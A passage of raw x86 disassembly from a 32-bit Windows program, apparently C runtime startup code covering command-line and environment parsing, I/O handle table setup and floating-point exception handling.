  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
